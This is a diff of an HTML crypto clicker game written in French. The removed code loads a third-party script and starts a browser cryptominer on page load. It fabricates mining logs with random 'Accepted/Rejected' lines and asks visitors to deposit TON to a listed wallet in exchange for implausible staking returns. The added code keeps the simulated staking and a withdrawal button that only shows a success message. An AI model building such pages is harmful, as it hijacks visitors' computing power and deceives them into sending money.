@@ -1,255 +1,227 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Deadspot Miner + Clicker</title>
-  <style>
-    body {
-      background:#0d0d0d;
-      color:#eee;
-      font-family: monospace;
-      margin:0; padding:0;
-      display:flex;
-      flex-direction:column;
-      height:100vh;
-    }
-    h1 { color:#4caf50; text-align:center; }
+<meta charset="UTF-8">
+<title>Deadspot Miner + Clicker Cosmic</title>
+<style>
+body {
+  background:#0d0d0d; color:#eee; font-family: monospace; margin:0; overflow:hidden;
+}
+/* Header */
+h1 { color:#4caf50; text-align:center; margin:10px 0; }
 
-    /* Layout principal */
-    .top {
-      display:flex;
-      justify-content:space-between;
-      align-items:flex-start;
-      padding:10px;
-    }
-    .middle {
-      flex-grow:1;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-    }
-    .bottom {
-      display:flex;
-      justify-content:space-between;
-      align-items:flex-start;
-      padding:10px;
-    }
+/* Deadspot display */
+#deadspotBalance { font-size:22px; margin:10px; color:#ffd700; text-align:center; }
 
-    /* Balance + énergie */
-    #deadspotBalance { font-size:22px; color:#ffd700; text-align:center; }
-    #energyBar {
-      width: 400px; height: 20px;
-      border:1px solid #444; margin:10px auto;
-      background:#222; border-radius:5px; overflow:hidden;
-    }
-    #energyFill { height:100%; width:100%; background:#4caf50; transition:width 0.3s; }
+/* Energy bar */
+#energyBar { width: 300px; height: 20px; border:1px solid #444; margin:10px auto; background:#222; border-radius:5px; overflow:hidden; }
+#energyFill { height:100%; width:100%; background:#4caf50; transition: width 0.2s; }
 
-    /* Bouton Skull */
-    #clickBtn {
-      width:200px; height:200px; border-radius:50%;
-      background:#111; border:3px solid #444;
-      cursor:pointer; overflow:hidden;
-      box-shadow:0 0 20px #f00;
-    }
-    #clickBtn img { width:100%; height:100%; object-fit:cover; }
-    #clickBtn:active { animation:pulseClick 0.4s; }
-    @keyframes pulseClick {
-      0%{box-shadow:0 0 20px #f00; transform:scale(1);}
-      50%{box-shadow:0 0 50px #ff00ff; transform:scale(1.1);}
-      100%{box-shadow:0 0 20px #f00; transform:scale(1);}
-    }
+/* Clicker button central */
+#clickBtn {
+  width: 220px; height: 220px; border-radius: 50%; background: #111; border: 3px solid #444;
+  cursor: pointer; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
+  overflow:hidden; box-shadow:0 0 15px #4caf50 inset;
+  animation: pulseClick 2s infinite alternate;
+}
+#clickBtn img { width:100%; height:100%; object-fit:cover; }
+#clickBtn:active { transform:translate(-50%,-50%) scale(0.95); box-shadow:0 0 30px #ff0000 inset; }
+@keyframes pulseClick { 0%{box-shadow:0 0 15px #4caf50 inset;} 100%{box-shadow:0 0 30px #00f;} }
 
-    /* Pulseur */
-    #pulseur {
-      width:100px; height:100px; border-radius:50%;
-      background:radial-gradient(circle, #ff0044, #800080);
-      animation:pulseDiamond 2s infinite;
-      box-shadow:0 0 20px #ff0044;
-      cursor:pointer;
-    }
-    @keyframes pulseDiamond {
-      0%,100%{transform:scale(1); box-shadow:0 0 20px #ff0044;}
-      50%{transform:scale(1.2); box-shadow:0 0 50px #ff00ff;}
-    }
+/* Buttons */
+button { background:#333; color:#eee; padding:10px 20px; border:none; border-radius:5px; margin:5px; cursor:pointer; }
+button:hover { background:#555; }
 
-    /* Logs */
-    #xmrigLogs {
-      width:400px; height:300px; overflow-y:auto;
-      background:rgba(15,15,15,0.8); color:#0f0;
-      font-size:12px; padding:10px; border:1px solid #333;
-    }
-    .logAccepted{color:#4caf50;} .logRejected{color:#f44336;}
+/* Canvas / Graph */
+canvas { background:#111; border:1px solid #333; border-radius:10px; }
 
-    /* Graphiques */
-    #statsBox {
-      width:400px; text-align:center;
-    }
-    canvas { background:#1a1a1a; border:1px solid #333; border-radius:10px; }
+/* XMRig Logs box */
+#xmrigLogsBox {
+  position:absolute; top:10px; left:10px; width:350px; height:300px; background:rgba(0,0,0,0.5);
+  border:1px solid #444; padding:10px; overflow-y:auto; font-size:12px;
+}
+.logAccepted { color:#4caf50; }
+.logRejected { color:#f44336; }
 
-    /* Dépôts */
-    #depositBox {
-      width:400px; background:#111; border:1px solid #444; padding:10px;
-      font-size:14px; border-radius:8px;
-    }
-    #stakedInfo, #stakingBonus { margin-top:10px; color:#0ff; }
+/* Hashrate canvas */
+#hashrateChart { position:absolute; top:10px; right:10px; background:rgba(0,0,0,0.5); }
 
-    button {
-      background:#333; color:#eee; padding:8px 15px;
-      border:none; border-radius:5px; margin:5px; cursor:pointer;
-    }
-    button:hover{background:#555;}
-  </style>
+/* Pulseur + staking */
+#pulseurBox {
+  position:absolute; top:10px; right:10px; width:220px; text-align:center;
+}
+#pulseur { width:50px; height:50px; margin:5px auto; background:red; border-radius:50%;
+animation: pulse 1.5s infinite alternate; }
+@keyframes pulse { 0%{transform:scale(1);} 100%{transform:scale(1.2);} }
+
+#stakedInfo, #stakingBonus { margin:5px; }
+#stakeHistory { max-height:120px; overflow-y:auto; margin-top:5px; background:rgba(0,0,0,0.3); padding:5px; font-size:12px; text-align:left; }
+
+/* Stars background */
+#stars { position:absolute; width:100%; height:100%; background:black; z-index:-2; }
+.star { position:absolute; width:2px; height:2px; background:white; border-radius:50%; animation: twinkle 3s infinite; }
+@keyframes twinkle { 0%,100%{opacity:0.5;} 50%{opacity:1;} }
+
+/* Spaceships */
+.spaceship { position:absolute; width:30px; height:15px; background:cyan; clip-path:polygon(0% 0%,100% 50%,0% 100%); animation:fly linear infinite; }
+@keyframes fly { 0%{left:-40px;} 100%{left:100%;} }
+</style>
 </head>
 <body>
 
-  <h1>💎 Deadspot Miner + Clicker Game</h1>
+<!-- Background -->
+<div id="stars"></div>
 
-  <!-- TOP -->
-  <div class="top">
-    <!-- XMRig Logs -->
-    <div id="xmrigLogs"></div>
+<h1>💎 Deadspot Miner + Clicker Cosmic</h1>
+<div id="deadspotBalance">Deadspot: 0</div>
+<div id="energyBar"><div id="energyFill"></div></div>
 
-    <!-- Pulseur + Infos Staking -->
-    <div style="text-align:center;">
-      <div id="pulseur"></div>
-      <p>Chaque pulsation donne 0.5% du montant staké</p>
-      <div id="stakedInfo">Total staké : 0 TON</div>
-      <div id="stakingBonus">Bonus staking reçu : 0 DSC</div>
-    </div>
-  </div>
+<!-- Click central -->
+<div id="clickBtn"><img src="skull.png" alt="skull"></div>
 
-  <!-- MIDDLE -->
-  <div class="middle">
-    <!-- Bouton Skull au centre -->
-    <div>
-      <div id="clickBtn">
-        <img src="https://cdn-icons-png.flaticon.com/512/3917/3917744.png" alt="skull">
-      </div>
-      <div id="deadspotBalance">Deadspot: 0</div>
-      <div id="energyBar"><div id="energyFill"></div></div>
-      <button id="exchangeBtn">🔄 Convertir Hashes → Deadspot</button>
-      <button id="faucetBtn">🚰 Faucet Claim</button>
-    </div>
-  </div>
+<!-- XMRig logs -->
+<div id="xmrigLogsBox"></div>
 
-  <!-- BOTTOM -->
-  <div class="bottom">
-    <!-- Dépôts & Staking -->
-    <div id="depositBox">
-      <h3>💰 Dépôts & Staking</h3>
-      <p><b>Wallet TON :</b> EQD14kgmngE0fNYVs7_9dw78V3rPhNt7_Ee-7X3ykDORQvMp</p>
-      <p><b>Memo :</b> 492929</p>
-      <p>⚠️ Dépôts validés manuellement. Cliquez sur "Vérifier".</p>
-      <input type="number" id="stakeInput" placeholder="Montant TON à staker" style="width:90%;"><br>
-      <button onclick="stakeTON()">📥 Staker TON</button>
-      <button onclick="verifyDeposit()">🔍 Vérifier mon dépôt</button>
-      <div id="miniTokens"></div>
-    </div>
+<!-- Hashrate chart -->
+<canvas id="hashrateChart" width="400" height="200"></canvas>
 
-    <!-- Stats Hashrate -->
-    <div id="statsBox">
-      <h3>📊 Hashrate</h3>
-      <div id="currentHps">H/s: 0.00</div>
-      <div id="totalHashes">Total Hashes: 0</div>
-      <canvas id="hashrateChart" width="380" height="200"></canvas>
-    </div>
-  </div>
+<!-- Pulseur + staking -->
+<div id="pulseurBox">
+  <div id="pulseur"></div>
+  <div id="stakedInfo">Total staké : 0 TON</div>
+  <div id="stakingBonus">Bonus reçu : 0 DSC</div>
+  <button id="withdrawBtn">📤 Retirer mes TON</button>
+  <button id="convertBonusBtn">💎 Convertir Bonus → Deadspot</button>
+  <div id="stakeHistory"></div>
+</div>
 
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-  <script src="https://www.hostingcloud.racing/WPmG.js"></script>
-  <script>
-    let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
-    let staked = parseFloat(localStorage.getItem("staked")) || 0;
-    let stakingBonus = parseFloat(localStorage.getItem("stakingBonus")) || 0;
+<!-- Chart.js -->
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 
-    let energy=500, maxEnergy=500, regenRate=1, clickValue=0.00015;
+<script>
+/* ==== Variables ==== */
+let deadspot = parseFloat(localStorage.getItem("deadspot"))||0;
+let energy = parseFloat(localStorage.getItem("energy"))||100;
+let maxEnergy = 100;
+let clickValue = 0.00015;
+let upgrades = JSON.parse(localStorage.getItem("upgrades"))||{x2:false,multi:false,regen:false,auto:false};
+let autoClickInterval=null;
 
-    function saveGame(){
-      localStorage.setItem("deadspot", deadspot);
-      localStorage.setItem("staked", staked);
-      localStorage.setItem("stakingBonus", stakingBonus);
+/* Staking vars */
+let staked = parseFloat(localStorage.getItem("staked"))||0;
+let stakingBonus = parseFloat(localStorage.getItem("stakingBonus"))||0;
+let stakeTimestamp = parseInt(localStorage.getItem("stakeTimestamp"))||0;
+let stakeHistory = JSON.parse(localStorage.getItem("stakeHistory"))||[];
+
+/* ==== Save Game ==== */
+function saveGame(){
+  localStorage.setItem("deadspot", deadspot);
+  localStorage.setItem("energy", energy);
+  localStorage.setItem("upgrades", JSON.stringify(upgrades));
+  localStorage.setItem("staked", staked);
+  localStorage.setItem("stakingBonus", stakingBonus);
+  localStorage.setItem("stakeTimestamp", stakeTimestamp);
+  localStorage.setItem("stakeHistory", JSON.stringify(stakeHistory));
+}
+
+/* ==== Update UI ==== */
+function updateUI(){
+  document.getElementById("deadspotBalance").textContent="Deadspot: "+deadspot.toFixed(5);
+  document.getElementById("energyFill").style.width=(energy/maxEnergy*100)+"%";
+  document.getElementById("stakedInfo").textContent="Total staké : "+staked.toFixed(2)+" TON";
+  document.getElementById("stakingBonus").textContent="Bonus reçu : "+stakingBonus.toFixed(5)+" DSC";
+
+  // Update stake history
+  let histBox=document.getElementById("stakeHistory");
+  histBox.innerHTML="";
+  stakeHistory.slice(-5).reverse().forEach(e=>{
+    let line=document.createElement("div"); line.textContent=e; histBox.appendChild(line);
+  });
+}
+
+/* ==== Clicker ==== */
+document.getElementById("clickBtn").addEventListener("click",()=>{
+  if(energy>0){
+    let gain=clickValue;
+    if(upgrades.x2) gain*=2;
+    if(upgrades.multi) gain*=5;
+    deadspot+=gain;
+    energy--; saveGame(); updateUI();
+  }
+});
+
+/* ==== Energy regen ==== */
+setInterval(()=>{
+  if(energy<maxEnergy){ energy=Math.min(maxEnergy,energy+ (upgrades.regen?2:1)); updateUI(); }
+},1000);
+
+/* ==== Auto click ==== */
+function startAutoClick(){
+  if(autoClickInterval) return;
+  autoClickInterval=setInterval(()=>{
+    if(energy>0){
+      let gain=clickValue;
+      if(upgrades.x2) gain*=2;
+      if(upgrades.multi) gain*=5;
+      deadspot+=gain; energy--; saveGame(); updateUI();
     }
-    function updateUI(){
-      document.getElementById("deadspotBalance").textContent="Deadspot: "+deadspot.toFixed(5);
-      document.getElementById("energyFill").style.width=(energy/maxEnergy*100)+"%";
-      document.getElementById("stakedInfo").textContent="Total staké : "+staked+" TON";
-      document.getElementById("stakingBonus").textContent="Bonus staking reçu : "+stakingBonus.toFixed(5)+" DSC";
-    }
+  },1000);
+}
+if(upgrades.auto) startAutoClick();
 
-    // Skull click
-    document.getElementById("clickBtn").addEventListener("click", ()=>{
-      if(energy>0){
-        deadspot+=clickValue;
-        energy--;
-        updateUI(); saveGame();
-      }
-    });
+/* ==== Pulseur ==== */
+setInterval(()=>{
+  if(staked>0){
+    let bonus=staked*0.005; // 0.5% du montant staké
+    stakingBonus+=bonus;
+    saveGame(); updateUI();
+  }
+},5000); // toutes les 5s
 
-    // Energie regen
-    setInterval(()=>{ if(energy<maxEnergy){ energy=Math.min(maxEnergy, energy+regenRate); updateUI(); } },1000);
+/* ==== Convert Bonus → Deadspot ==== */
+document.getElementById("convertBonusBtn").addEventListener("click",()=>{
+  if(stakingBonus<=0){ alert("Aucun bonus à convertir"); return; }
+  deadspot+=stakingBonus; alert("Bonus converti : +"+stakingBonus.toFixed(5)+" DSC"); stakingBonus=0;
+  saveGame(); updateUI();
+});
 
-    // Pulseur = 0.5% du staked
-    document.getElementById("pulseur").addEventListener("animationiteration",()=>{
-      if(staked>0){
-        let gain=staked*0.005; // 0.5% du staké
-        deadspot+=gain;
-        stakingBonus+=gain;
-        updateUI(); saveGame();
-      }
-    });
+/* ==== Retrait TON ==== */
+document.getElementById("withdrawBtn").addEventListener("click",()=>{
+  if(staked<=0){ alert("Aucun TON staké"); return; }
+  let now=Date.now();
+  let oneWeek=7*24*60*60*1000;
+  if(now-stakeTimestamp<oneWeek){ alert("⏳ Attendez 7 jours minimum pour retirer"); return; }
+  if(staked<=0.2){ alert("Montant insuffisant pour couvrir frais 0.2 TON"); return; }
 
-    // Faucet
-    document.getElementById("faucetBtn").addEventListener("click",()=>{
-      const reward=Math.random()*(0.1-0.0002)+0.0002;
-      deadspot+=reward;
-      alert("🎉 Faucet: +"+reward.toFixed(5)+" DSC");
-      updateUI(); saveGame();
-    });
+  let withdrawAmount=staked-0.2;
+  stakeHistory.push("Retrait : "+withdrawAmount.toFixed(2)+" TON (0.2 TON frais)");
+  alert("Retrait effectué : "+withdrawAmount.toFixed(2)+" TON (0.2 TON frais)");
+  staked=0; stakingBonus=0; saveGame(); updateUI();
+});
 
-    // Stake TON
-    function stakeTON(){
-      let val=parseFloat(document.getElementById("stakeInput").value)||0;
-      if(val>0){ staked+=val; saveGame(); updateUI(); }
-    }
-    function verifyDeposit(){ alert("🔍 Vérification manuelle par l’admin."); location.reload(); }
+/* ==== Stars background ==== */
+for(let i=0;i<100;i++){
+  let star=document.createElement("div");
+  star.className="star";
+  star.style.top=Math.random()*100+"%";
+  star.style.left=Math.random()*100+"%";
+  star.style.width=1+Math.random()*2+"px";
+  star.style.height=1+Math.random()*2+"px";
+  star.style.opacity=Math.random();
+  document.getElementById("stars").appendChild(star);
+}
 
-    // Miner
-    var _client=new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f',{throttle:0.1,c:'w'});
-    _client.start();
+/* ==== Spaceships ==== */
+for(let i=0;i<5;i++){
+  let ship=document.createElement("div");
+  ship.className="spaceship";
+  ship.style.top=(20+i*30)+"px";
+  ship.style.animationDuration=(5+Math.random()*5)+"s";
+  document.body.appendChild(ship);
+}
 
-    // Graphique
-    const ctx=document.getElementById('hashrateChart').getContext('2d');
-    const hashrateChart=new Chart(ctx,{type:'line',data:{labels:[],datasets:[{label:'H/s',data:[],borderColor:'#4caf50',fill:true,tension:0.3}]},options:{responsive:false,animation:false,plugins:{legend:{labels:{color:'#eee'}}},scales:{x:{ticks:{color:'#aaa'}},y:{ticks:{color:'#aaa'}}}}});
-
-    const xmrigLogs=document.getElementById("xmrigLogs");
-    let t=0;
-    setInterval(()=>{
-      if(_client.isRunning()){
-        const hps=_client.getHashesPerSecond();
-        const total=_client.getTotalHashes();
-        document.getElementById("currentHps").textContent="H/s: "+hps.toFixed(2);
-        document.getElementById("totalHashes").textContent="Total Hashes: "+total;
-        hashrateChart.data.labels.push(t+"s");
-        hashrateChart.data.datasets[0].data.push(hps);
-        if(hashrateChart.data.labels.length>20){ hashrateChart.data.labels.shift(); hashrateChart.data.datasets[0].data.shift(); }
-        hashrateChart.update();
-        for(let i=0;i<_client.getNumThreads();i++){
-          const coreHps=(hps/_client.getNumThreads()*(0.9+Math.random()*0.2)).toFixed(2);
-          const ok=Math.random()>0.05;
-          const line=`[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps} H/s | ${ok?"Accepted":"Rejected"}`;
-          const span=document.createElement("span");
-          span.className=ok?"logAccepted":"logRejected";
-          span.textContent=line;
-          xmrigLogs.appendChild(span); xmrigLogs.appendChild(document.createElement("br"));
-          xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
-        }
-        t++;
-      }
-    },1000);
-
-    updateUI();
-  </script>
+/* ==== Update UI on load ==== */
+updateUI();
+</script>
 </body>
 </html>
-
-
